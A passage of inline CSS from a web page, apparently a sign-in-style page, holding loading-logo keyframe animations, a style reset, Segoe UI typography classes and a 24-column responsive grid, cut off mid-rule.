                animation-iteration-count: 1000;
            }
            #loadingLogo29_ts {
                animation: loadingLogo29_ts__ts 3000ms linear 1 normal forwards;
                animation-iteration-count: 1000;
            }
            @keyframes loadingLogo2_ts__ts {
                0% {
                    transform: translate(108.89443px, 155.715127px) scale(0.668963, 0.668963);
                    animation-timing-function: cubic-bezier(0.42, 0, 0.58, 1);
                }
                26.666667% {
                    transform: translate(108.89443px, 155.715127px) scale(1, 1);
                }
                100% {
                    transform: translate(108.89443px, 155.715127px) scale(1, 1);
                }
            }
            @keyframes loadingLogo2_c_o {
                0% {
                    opacity: 0;
                }
                18.333333% {
                    opacity: 1;
                }
                100% {
                    opacity: 1;
                }
            }
            @keyframes loadingLogo3_to__to {
                0% {
                    transform: translate(101.000155px, 195.970703px);
                }
                13.333333% {
                    transform: translate(101.000155px, 195.970703px);
                    animation-timing-function: cubic-bezier(0, 0, 1, 0.025);
                }
                31% {
                    transform: translate(101.000155px, 206px);
                    animation-timing-function: cubic-bezier(0.135, 0.71, 0.03, 0.985);
                }
                50% {
                    transform: translate(101.000155px, 195.970703px);
                }
                100% {
                    transform: translate(101.000155px, 195.970703px);
                }
            }
            @keyframes loadingLogo6_ts__ts {
                0% {
                    transform: translate(101.000708px, 97.499588px) scale(1, -0.00172);
                }
                23.333333% {
                    transform: translate(101.000708px, 97.499588px) scale(1, -0.00172);
                    animation-timing-function: cubic-bezier(0.135, 0.71, 0.03, 0.985);
                }
                40% {
                    transform: translate(101.000708px, 97.499588px) scale(1, 1);
                }
                100% {
                    transform: translate(101.000708px, 97.499588px) scale(1, 1);
                }
            }
            @keyframes loadingLogo8_ts__ts {
                0% {
                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
                }
                39.666667% {
                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
                }
                50% {
                    transform: translate(101.000699px, 159.914723px) scale(1, 1.05036);
                }
                52.333333% {
                    transform: translate(101.000699px, 159.914723px) scale(1, 0.959233);
                }
                57.666667% {
                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
                }
                100% {
                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
                }
            }
            @keyframes loadingLogo9_to__to {
                0% {
                    transform: translate(101px, 205.753765px);
                }
                26.666667% {
                    transform: translate(101px, 205.753765px);
                    animation-timing-function: cubic-bezier(0.175, 0.885, 0.32, 1.275);
                }
                50% {
                    transform: translate(101px, 81px);
                }
                100% {
                    transform: translate(101px, 81px);
                }
            }
            @keyframes loadingLogo29_ts__ts {
                0% {
                    transform: translate(101.000699px, 97.499573px) scale(1, 1);
                }
                13.333333% {
                    transform: translate(101.000699px, 97.499573px) scale(1, 1);
                    animation-timing-function: cubic-bezier(0, 0, 1, 0.025);
                }
                23.333333% {
                    transform: translate(101.000699px, 97.499573px) scale(1, 0.001723);
                }
                100% {
                    transform: translate(101.000699px, 97.499573px) scale(1, 0.001723);
                }
            }
		#bg_img {
			height: 100%;
			background-position: center;
			background-repeat: no-repeat;
			background-size: cover
		}
            
            html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0 ; }
article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}
audio,canvas,progress,video{display:inline-block;vertical-align:baseline}
audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}*:before,*:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}a:focus{outline:thin dotted;outline-offset:-2px;outline:5px auto -webkit-focus-ring-color}figure{margin:0}img{vertical-align:middle}.img-responsive{display:block;max-width:100%;height:auto}.img-circle{border-radius:50%}.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}html{font-size:100%}body{font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px;color:#000;background-color:#fff}a{color:#ccc;text-decoration:none}a:link{color:#0067b8}a:visited{color:#0067b8}a:hover{color:#666}a:focus{color:#0067b8}a:active{color:#999}.text-center{text-align:center}.text-justify{text-align:justify}.text-nowrap{white-space:nowrap}.text-lowercase{text-transform:lowercase}.text-uppercase{text-transform:uppercase}.text-capitalize{text-transform:capitalize}ul,ol{margin-top:0;margin-bottom:10px}ul ul,ul ol,ol ul,ol ol{margin-bottom:0}abbr[title],abbr[data-original-title]{cursor:help}blockquote p:last-child,blockquote ul:last-child,blockquote ol:last-child{margin-bottom:0}blockquote footer,blockquote small,blockquote .small{display:block}address{font-style:normal}@font-face{font-family:\'Segoe UI Webfont\';src:local("Segoe UI Light");font-weight:200;font-style:normal}@font-face{font-family:\'Segoe UI Webfont\';src:local("Segoe UI");font-weight:400;font-style:normal}@font-face{font-family:\'Segoe UI Webfont\';src:local("Segoe UI Semibold");font-weight:600;font-style:normal}h1,h2,h3,h4,h5,h6,.text-headline,.text-header,.text-subheader,.text-title,.text-subtitle,.text-body,.text-base,.text-caption,.text-caption-alt,.text-subcaption,p{margin-bottom:20px;margin-top:20px;margin-bottom:1.25rem;margin-top:1.25rem}.text-headline{font-size:62px;line-height:80px;font-weight:200;font-size:3.875rem;line-height:5rem;padding-bottom:2.2716px;padding-top:2.2716px}.text-headline.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:84.5432px;max-height:5.28395rem}.text-headline.text-maxlines-2{max-height:164.5432px;max-height:10.28395rem}.text-headline.text-maxlines-3{max-height:244.5432px;max-height:15.28395rem}.text-headline.text-maxlines-4{max-height:324.5432px;max-height:20.28395rem}.text-header,h1{font-size:46px;line-height:56px;font-weight:200;font-size:2.875rem;line-height:3.5rem;padding-bottom:3.3628px;padding-top:3.3628px}.text-header.text-maxlines-1,h1.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:62.7256px;max-height:3.92035rem}.text-header.text-maxlines-2,h1.text-maxlines-2{max-height:118.7256px;max-height:7.42035rem}.text-header.text-maxlines-3,h1.text-maxlines-3{max-height:174.7256px;max-height:10.92035rem}.text-header.text-maxlines-4,h1.text-maxlines-4{max-height:230.7256px;max-height:14.42035rem}.text-subheader,h2{font-size:34px;line-height:40px;font-weight:200;font-size:2.125rem;line-height:2.5rem;padding-bottom:3.1812px;padding-top:3.1812px}.text-subheader.text-maxlines-1,h2.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:46.3624px;max-height:2.89765rem}.text-subheader.text-maxlines-2,h2.text-maxlines-2{max-height:86.3624px;max-height:5.39765rem}.text-subheader.text-maxlines-3,h2.text-maxlines-3{max-height:126.3624px;max-height:7.89765rem}.text-subheader.text-maxlines-4,h2.text-maxlines-4{max-height:166.3624px;max-height:10.39765rem}.text-title,h3{font-size:24px;line-height:28px;font-weight:300;font-size:1.5rem;line-height:1.75rem;padding-bottom:2.3632px;padding-top:2.3632px}.text-title.text-maxlines-1,h3.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:32.7264px;max-height:2.0454rem}.text-title.text-maxlines-2,h3.text-maxlines-2{max-height:60.7264px;max-height:3.7954rem}.text-title.text-maxlines-3,h3.text-maxlines-3{max-height:88.7264px;max-height:5.5454rem}.text-title.text-maxlines-4,h3.text-maxlines-4{max-height:116.7264px;max-height:7.2954rem}.text-subtitle,h4{font-size:20px;line-height:24px;font-weight:400;font-size:1.25rem;line-height:1.5rem;padding-bottom:1.636px;padding-top:1.636px}.text-subtitle.text-maxlines-1,h4.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:27.272px;max-height:1.7045rem}.text-subtitle.text-maxlines-2,h4.text-maxlines-2{max-height:51.272px;max-height:3.2045rem}.text-subtitle.text-maxlines-3,h4.text-maxlines-3{max-height:75.272px;max-height:4.7045rem}.text-subtitle.text-maxlines-4,h4.text-maxlines-4{max-height:99.272px;max-height:6.2045rem}.text-caption,h5{font-size:12px;line-height:14px;font-weight:400;font-size:.75rem;line-height:.875rem;padding-bottom:1.1816px;padding-top:1.1816px}.text-caption.text-maxlines-1,h5.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:16.3632px;max-height:1.0227rem}.text-caption.text-maxlines-2,h5.text-maxlines-2{max-height:30.3632px;max-height:1.8977rem}.text-caption.text-maxlines-3,h5.text-maxlines-3{max-height:44.3632px;max-height:2.7727rem}.text-caption.text-maxlines-4,h5.text-maxlines-4{max-height:58.3632px;max-height:3.6477rem}.text-caption-alt,h6{font-size:10px;line-height:12px;font-weight:400;font-size:.625rem;line-height:.75rem;padding-bottom:.818px;padding-top:.818px}.text-caption-alt.text-maxlines-1,h6.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:13.636px;max-height:.85225rem}.text-caption-alt.text-maxlines-2,h6.text-maxlines-2{max-height:25.636px;max-height:1.60225rem}.text-caption-alt.text-maxlines-3,h6.text-maxlines-3{max-height:37.636px;max-height:2.35225rem}.text-caption-alt.text-maxlines-4,h6.text-maxlines-4{max-height:49.636px;max-height:3.10225rem}.text-subcaption{font-size:8px;line-height:10px;font-weight:400;font-size:.5rem;line-height:.625rem;padding-bottom:.4544px;padding-top:.4544px}.text-subcaption.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:10.9088px;max-height:.6818rem}.text-subcaption.text-maxlines-2{max-height:20.9088px;max-height:1.3068rem}.text-subcaption.text-maxlines-3{max-height:30.9088px;max-height:1.9318rem}.text-subcaption.text-maxlines-4{max-height:40.9088px;max-height:2.5568rem}.text-body,p{font-size:15px;line-height:20px;font-weight:400;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px}.text-body.text-maxlines-1,p.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:20.454px;max-height:1.27838rem}.text-body.text-maxlines-2,p.text-maxlines-2{max-height:40.454px;max-height:2.52838rem}.text-body.text-maxlines-3,p.text-maxlines-3{max-height:60.454px;max-height:3.77838rem}.text-body.text-maxlines-4,p.text-maxlines-4{max-height:80.454px;max-height:5.02838rem}.text-base{font-size:15px;line-height:20px;font-weight:600;font-size:.9375rem;line-height:1.25rem;padding-bottom:.227px;padding-top:.227px}.text-base.text-maxlines-1{white-space:nowrap;text-overflow:ellipsis;max-height:20.454px;max-height:1.27838rem}.text-base.text-maxlines-2{max-height:40.454px;max-height:2.52838rem}.text-base.text-maxlines-3{max-height:60.454px;max-height:3.77838rem}.text-base.text-maxlines-4{max-height:80.454px;max-height:5.02838rem}[class*="text-maxlines"]{overflow:hidden}.text-left{text-align:left}.text-right{text-align:right}.list-unstyled{padding-left:0;list-style:none}ul{padding-left:0;list-style:none}ul,ol{margin-top:20px;margin-bottom:20px}ul li,ol li{margin-top:12px;margin-bottom:12px}.list-inline{padding-left:0;list-style:none;margin-left:-4px}.list-inline>li{display:inline-block;padding-left:4px;padding-right:4px}blockquote{padding:8px 12px;margin:0 0 12px}.blockquote-reverse,blockquote.pull-right{padding-right:12px;padding-left:0;text-align:right}address{margin-bottom:12px}.container,.container-fluid{margin-right:auto;margin-left:auto;padding-left:2px;padding-right:2px;width:90%}.container:before,.container:after,.container-fluid:before,.container-fluid:after{content:" ";display:table}.container:after,.container-fluid:after{clear:both}.container .container,.container-fluid .container{width:auto}.row{margin-left:-2px;margin-right:-2px}.row:before,.row:after{content:" ";display:table}.row:after{clear:both}.col-xs-1,.col-sm-1,.col-md-1,.col-lg-1,.col-xs-2,.col-sm-2,.col-md-2,.col-lg-2,.col-xs-3,.col-sm-3,.col-md-3,.col-lg-3,.col-xs-4,.col-sm-4,.col-md-4,.col-lg-4,.col-xs-5,.col-sm-5,.col-md-5,.col-lg-5,.col-xs-6,.col-sm-6,.col-md-6,.col-lg-6,.col-xs-7,.col-sm-7,.col-md-7,.col-lg-7,.col-xs-8,.col-sm-8,.col-md-8,.col-lg-8,.col-xs-9,.col-sm-9,.col-md-9,.col-lg-9,.col-xs-10,.col-sm-10,.col-md-10,.col-lg-10,.col-xs-11,.col-sm-11,.col-md-11,.col-lg-11,.col-xs-12,.col-sm-12,.col-md-12,.col-lg-12,.col-xs-13,.col-sm-13,.col-md-13,.col-lg-13,.col-xs-14,.col-sm-14,.col-md-14,.col-lg-14,.col-xs-15,.col-sm-15,.col-md-15,.col-lg-15,.col-xs-16,.col-sm-16,.col-md-16,.col-lg-16,.col-xs-17,.col-sm-17,.col-md-17,.col-lg-17,.col-xs-18,.col-sm-18,.col-md-18,.col-lg-18,.col-xs-19,.col-sm-19,.col-md-19,.col-lg-19,.col-xs-20,.col-sm-20,.col-md-20,.col-lg-20,.col-xs-21,.col-sm-21,.col-md-21,.col-lg-21,.col-xs-22,.col-sm-22,.col-md-22,.col-lg-22,.col-xs-23,.col-sm-23,.col-md-23,.col-lg-23,.col-xs-24,.col-sm-24,.col-md-24,.col-lg-24{position:relative;min-height:1px;padding-left:2px;padding-right:2px}.col-xs-1,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-13,.col-xs-14,.col-xs-15,.col-xs-16,.col-xs-17,.col-xs-18,.col-xs-19,.col-xs-20,.col-xs-21,.col-xs-22,.col-xs-23,.col-xs-24{float:left}.col-xs-1{width:4.16667%}.col-xs-2{width:8.33333%}.col-xs-3{width:12.5%}.col-xs-4{width:16.66667%}.col-xs-5{width:20.83333%}.col-xs-6{width:25%}.col-xs-7{width:29.16667%}.col-xs-8{width:33.33333%}.col-xs-9{width:37.5%}.col-xs-10{width:41.66667%}.col-xs-11{width:45.83333%}.col-xs-12{width:50%}.col-xs-13{width:54.16667%}.col-xs-14{width:58.33333%}.col-xs-15{width:62.5%}.col-xs-16{width:66.66667%}.col-xs-17{width:70.83333%}.col-xs-18{width:75%}.col-xs-19{width:79.16667%}.col-xs-20{width:83.33333%}.col-xs-21{width:87.5%}.col-xs-22{width:91.66667%}.col-xs-23{width:95.83333%}.col-xs-24{width:100%}.col-xs-pull-0{right:auto}.col-xs-pull-1{right:4.16667%}.col-xs-pull-2{right:8.33333%}.col-xs-pull-3{right:12.5%}.col-xs-pull-4{right:16.66667%}.col-xs-pull-5{right:20.83333%}.col-xs-pull-6{right:25%}.col-xs-pull-7{right:29.16667%}.col-xs-pull-8{right:33.33333%}.col-xs-pull-9{right:37.5%}.col-xs-pull-10{right:41.66667%}.col-xs-pull-11{right:45.83333%}.col-xs-pull-12{right:50%}.col-xs-pull-13{right:54.16667%}.col-xs-pull-14{right:58.33333%}.col-xs-pull-15{right:62.5%}.col-xs-pull-16{right:66.66667%}.col-xs-pull-17{right:70.83333%}.col-xs-pull-18{right:75%}.col-xs-pull-19{right:79.16667%}.col-xs-pull-20{right:83.33333%}.col-xs-pull-21{right:87.5%}.col-xs-pull-22{right:91.66667%}.col-xs-pull-23{right:95.83333%}.col-xs-pull-24{right:100%}.col-xs-push-0{left:auto}.col-xs-push-1{left:4.16667%}.col-xs-push-2{left:8.33333%}.col-xs-push-3{left:12.5%}.col-xs-push-4{left:16.66667%}.col-xs-push-5{left:20.83333%}.col-xs-push-6{left:25%}.col-xs-push-7{left:29.16667%}.col-xs-push-8{left:33.33333%}.col-xs-push-9{left:37.5%}.col-xs-push-10{left:41.66667%}.col-xs-push-11{left:45.83333%}.col-xs-push-12{left:50%}.col-xs-push-13{left:54.16667%}.col-xs-push-14{left:58.33333%}.col-xs-push-15{left:62.5%}.col-xs-push-16{left:66.66667%}.col-xs-push-17{left:70.83333%}.col-xs-push-18{left:75%}.col-xs-push-19{left:79.16667%}.col-xs-push-20{left:83.33333%}.col-xs-push-21{left:87.5%}.col-xs-push-22{left:91.66667%}.col-xs-push-23{left:95.83333%}.col-xs-push-24{left:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:4.16667%}.col-xs-offset-2{margin-left:8.33333%}.col-xs-offset-3{margin-left:12.5%}.col-xs-offset-4{margin-left:16.66667%}.col-xs-offset-5{margin-left:20.83333%}.col-xs-offset-6{margin-left:25%}.col-xs-offset-7{margin-left:29.16667%}.col-xs-offset-8{margin-left:33.33333%}.col-xs-offset-9{margin-left:37.5%}.col-xs-offset-10{margin-left:41.66667%}.col-xs-offset-11{margin-left:45.83333%}.col-xs-offset-12{margin-left:50%}.col-xs-offset-13{margin-left:54.16667%}.col-xs-offset-14{margin-left:58.33333%}.col-xs-offset-15{margin-left:62.5%}.col-xs-offset-16{margin-left:66.66667%}.col-xs-offset-17{margin-left:70.83333%}.col-xs-offset-18{margin-left:75%}.col-xs-offset-19{margin-left:79.16667%}.col-xs-offset-20{margin-left:83.33333%}.col-xs-offset-21{margin-left:87.5%}.col-xs-offset-22{margin-left:91.66667%}.col-xs-offset-23{margin-left:95.83333%}.col-xs-offset-24{margin-left:100%}@media (min-width:540px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-13,.col-sm-14,.col-sm-15,.col-sm-16,.col-sm-17,.col-sm-18,.col-sm-19,.col-sm-20,.col-sm-21,.col-sm-22,.col-sm-23,.col-sm-24{float:left}.col-sm-1{width:4.16667%}.col-sm-2{width:8.33333%}.col-sm-3{width:12.5%}.col-sm-4{width:16.66667%}.col-sm-5{width:20.83333%}.col-sm-6{width:25%}.col-sm-7{width:29.16667%}.col-sm-8{width:33.33333%}.col-sm-9{width:37.5%}.col-sm-10{width:41.66667%}.col-sm-11{width:45.83333%}.col-sm-12{width:50%}.col-sm-13{width:54.16667%}.col-sm-14{width:58.33333%}.col-sm-15{width:62.5%}.col-sm-16{width:66.66667%}.col-sm-17{width:70.83333%}.col-sm-18{width:75%}.col-sm-19{width:79.16667%}.col-sm-20{width:83.33333%}.col-sm-21{width:87.5%}.col-sm-22{width:91.66667%}.col-sm-23{width:95.83333%}.col-sm-24{width:100%}.col-sm-pull-0{right:auto}.col-sm-pull-1{right:4.16667%}.col-sm-pull-2{right:8.33333%}.col-sm-pull-3{right:12.5%}.col-sm-pull-4{right:16.66667%}.col-sm-pull-5{right:20.83333%}.col-sm-pull-6{right:25%}.col-sm-pull-7{right:29.16667%}.col-sm-pull-8{right:33.33333%}.col-sm-pull-9{right:37.5%}.col-sm-pull-10{right:41.66667%}.col-sm-pull-11{right:45.83333%}.col-sm-pull-12{right:50%}.col-sm-pull-13{right:54.16667%}.col-sm-pull-14{right:58.33333%}.col-sm-pull-15{right:62.5%}.col-sm-pull-16{right:66.66667%}.col-sm-pull-17{right:70.83333%}.col-sm-pull-18{right:75%}.col-sm-pull-19{right:79.16667%}.col-sm-pull-20{right:83.33333%}.col-sm-pull-21{right:87.5%}.col-sm-pull-22{right:91.66667%}.col-sm-pull-23{right:95.83333%}.col-sm-pull-24{right:100%}.col-sm-push-0{left:auto}.col-sm-push-1{left:4.16667%}.col-sm-push-2{left:8.33333%}.col-sm-push-3{left:12.5%}.col-sm-push-4{left:16.66667%}.col-sm-push-5{left:20.83333%}.col-sm-push-6{left:25%}.col-sm-push-7{left:29.16667%}.col-sm-push-8{left:33.33333%}.col-sm-push-9{left:37.5%}.col-sm-push-10{left:41.66667%}.col-sm-push-11{left:45.83333%}.col-sm-push-12{left:50%}.col-sm-push-13{left:54.16667%}.col-sm-push-14{left:58.33333%}.col-sm-push-15{left:62.5%}.col-sm-push-16{left:66.66667%}.col-sm-push-17{left:70.83333%}.col-sm-push-18{left:75%}.col-sm-push-19{left:79.16667%}.col-sm-push-20{left:83.33333%}.col-sm-push-21{left:87.5%}.col-sm-push-22{left:91.66667%}.col-sm-push-23{left:95.83333%}.col-sm-push-24{left:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:4.16667%}.col-sm-offset-2{margin-left:8.33333%}.col-sm-offset-3{margin-left:12.5%}.col-sm-offset-4{margin-left:16.66667%}.col-sm-offset-5{margin-left:20.83333%}.col-sm-offset-6{margin-left:25%}.col-sm-offset-7{margin-left:29.16667%}.col-sm-offset-8{margin-left:33.33333%}.col-sm-offset-9{margin-left:37.5%}.col-sm-offset-10{margin-left:41.66667%}.col-sm-offset-11{margin-left:45.83333%}.col-sm-offset-12{margin-left:50%}.col-sm-offset-13{margin-left:54.16667%}.col-sm-offset-14{margin-left:58.33333%}.col-sm-offset-15{margin-left:62.5%}.col-sm-offset-16{margin-left:66.66667%}.col-sm-offset-17{margin-left:70.83333%}.col-sm-offset-18{margin-left:75%}.col-sm-offset-19{margin-left:79.16667%}.col-sm-offset-20{margin-left:83.33333%}.col-sm-offset-21{margin-left:87.5%}.col-sm-offset-22{margin-left:91.66667%}.col-sm-offset-23{margin-left:95.83333%}.col-sm-offset-24{margin-left:100%}}@media (min-width:768px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12,.col-md-13,.col-md-14,.col-md-15,.col-md-16,.col-md-17,.col-md-18,.col-md-19,.col-md-20,.col-md-21,.col-md-22,.col-md-23,.col-md-24{float:left}.col-md-1{width:4.16667%}.col-md-2{width:8.33333%}.col-md-3{width:12.5%}.col-md-4{width:16.66667%}.col-md-5{width:20.83333%}.col-md-6{width:25%}.col-md-7{width:29.16667%}.col-md-8{width:33.33333%}.col-md-9{width:37.5%}.col-md-10{width:41.66667%}.col-md-11{width:45.83333%}.col-md-12{width:50%}.col-md-13{width:54.16667%}.col-md-14{width:58.33333%}.col-md-15{width:62.5%}.col-md-16{width:66.66667%}.col-md-17{width:70.83333%}.col-md-18{width:75%}.col-md-19{width:79.16667%}.col-md-20{width:83.33333%}.col-md-21{width:87.5%}.col-md-22{width:91.66667%}.col-md-23{width:95.83333%}.col-md-24{width:100%}.col-md-pull-0{right:auto}.col-md-pull-1{right:4.16667%}.col-md-pull-2{right:8.33333%}.col-md-pull-3{right:12.5%}.col-md-pull-4{right:16.66667%}.col-md-pull-5{right:20.83333%}.col-md-pull-6{right:25%}.col-md-pull-7{right:29.16667%}.col-md-pull-8{right:33.33333%}.col-md-pull-9{right:37.5%}.col-md-pull-10{right:41.66667%}.col-md-pull-11{right:45.83333%}.col-md-pull-12{right:50%}.col-md-pull-13{right:54.16667%}.col-md-pull-14{right:58.33333%}.col-md-pull-15{right:62.5%}.col-md-pull-16{right:66.66667%}.col-md-pull-17{right:70.83333%}.col-md-pull-18{right:75%}.col-md-pull-19{right:79.16667%}.col-md-pull-20{right:83.33333%}.col-md-pull-21{right:87.5%}.col-md-pull-22{right:91.66667%}.col-md-pull-23{right:95.83333%}.col-md-pull-24{right:100%}.col-md-push-0{left:auto}.col-md-push-1{left:4.16667%}.col-md-push-2{left:8.33333%}.col-md-push-3{left:12.5%}.col-md-push-4{left:16.66667%}.col-md-push-5{left:20.83333%}.col-md-push-6{left:25%}.col-md-push-7{left:29.16667%}.col-md-push-8{left:33.33333%}.col-md-push-9{left:37.5%}.col-md-push-10{left:41.66667%}.col-md-push-11{left:45.83333%}.col-md-push-12{left:50%}.col-md-push-13{left:54.16667%}.col-md-push-14{left:58.33333%}.col-md-push-15{left:62.5%}.col-md-push-16{left:66.66667%}.col-md-push-17{left:70.83333%}.col-md-push-18{left:75%}.col-md-push-19{left:79.16667%}.col-md-push-20{left:83.33333%}.col-md-push-21{left:87.5%}.col-md-push-22{left:91.66667%}.col-md-push-23{left:95.83333%}.col-md-push-24{left:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:4.16667%}.col-md-offset-2{margin-left:8.33333%}.col-md-offset-3{margin-left:12.5%}.col-md-offset-4{margin-left:16.66667%}.col-md-offset-5{margin-left:20.83333%}.col-md-offset-6{margin-left:25%}.col-md-offset-7{margin-left:29.16667%}.col-md-offset-8{margin-left:33.33333%}.col-md-offset-9{margin-left:37.5%}.col-md-offset-10{margin-left:41.66667%}.col-md-offset-11{margin-left:45.83333%}.col-md-offset-12{margin-left:50%}.col-md-offset-13{margin-left:54.16667%}.col-md-offset-14{margin-left:58.33333%}.col-md-offset-15{margin-left:62.5%}.col-md-offset-16{margin-left:66.66667%}.col-md-offset-17{margin-left:70.83333%}.col-md-offset-18{margin-left:75%}.col-md-offset-19{margin-left:79.16667%}.col-md-offset-20{margin-left:83.33333%}.col-md-offset-21{margin-left:87.5%}.col-md-offset-22{margin-left:91.66667%}.col-md-offset-23{margin-left:95.83333%}.col-md-offset-24{margin-left:100%}}@media (min-width:992px){.col-lg-1,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-13,.col-lg-14,.col-lg-15,.col-lg-16,.col-lg-17,.col-lg-18,.col-lg-19,.col-lg-20,.col-lg-21,.col-lg-22,.col-lg-23,.col-lg-24{float:left}.col-lg-1{width:4.16667%}.col-lg-2{width:8.33333%}.col-lg-3{width:12.5%}.col-lg-4{width:16.66667%}.col-lg-5{width:20.83333%}.col-lg-6{width:25%}.col-lg-7{width:29.16667%}.col-lg-8{width:33.33333%}.col-lg-9{width:37.5%}.col-lg-10{width:41.66667%}.col-lg-11{width:45.83333%}.col-lg-12{width:50%}.col-lg-13{width:54.16667%}.col-lg-14{width:58.33333%}.col-lg-15{width:62.5%}.col-lg-16{width:66.66667%}.col-lg-17{width:70.83333%}.col-lg-18{width:75%}.col-lg-19{width:79.16667%}.col-lg-20{width:83.33333%}.col-lg-21{width:87.5%}.col-lg-22{width:91.66667%}.col-lg-23{width:95.83333%}.col-lg-24{width:100%}.col-lg-pull-0{right:auto}.col-lg-pull-1{right:4.16667%}.col-lg-pull-2{right:8.33333%}.col-lg-pull-3{right:12.5%}.col-lg-pull-4{right:16.66667%}.col-lg-pull-5{right:20.83333%}.col-lg-pull-6{right:25%}.col-lg-pull-7{right:29.16667%}.col-lg-pull-8{right:33.33333%}.col-lg-pull-9{right:37.5%}.col-lg-pull-10{right:41.66667%}.col-lg-pull-11{right:45.83333%}.col-lg-pull-12{right:50%}.col-lg-pull-13{right:54.16667%}.col-lg-pull-14{right:58.33333%}.col-lg-pull-15{right:62.5%}.col-lg-pull-16{right:66.66667%}.col-lg-pull-17{right:70.83333%}.col-lg-pull-18{right:75%}.col-lg-pull-19{right:79.16667%}.col-lg-pull-20{right:83.33333%}.col-lg-pull-21{right:87.5%}.col-lg-pull-22{right:91.66667%}.col-lg-pull-23{right:95.83333%}.col-lg-pull-24{right:100%}.col-lg-push-0{left:auto}.col-lg-push-1{left:4.16667%}.col-lg-push-2{left:8.33333%}.col-lg-push-3{left:12.5%}.col-lg-push-4{left:16.66667%}.col-lg-push-5{left:20.83333%}.col-lg-push-6{left:25%}.col-lg-push-7{left:29.16667%}.col-lg-push-8{left:33.33333%}.col-lg-push-9{left:37.5%}.col-lg-push-10{left:41.66667%}.col-lg-push-11{left:45.83333%}.col-lg-push-12{left:50%}.col-lg-push-13{left:54.16667%}.col-lg-push-14{left:58.33333%}.col-lg-push-15{left:62.5%}.col-lg-push-16{left:66.66667%}.col-lg-push-17{left:70.83333%}.col-lg-push-18{left:75%}.col-lg-push-19{left:79.16667%}.col-lg-push-20{left:83.33333%}.col-lg-push-21{left:87.5%}.col-lg-push-22{left:91.66667%}.col-lg-push-23{left:95.83333%}.col-lg-push-24{left:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:4.16667%}.col-lg-offset-2{margin-left:8.33333%}.col-lg-offset-3{margin-left:12.5%}.col-lg-offset-4{margin-left:16.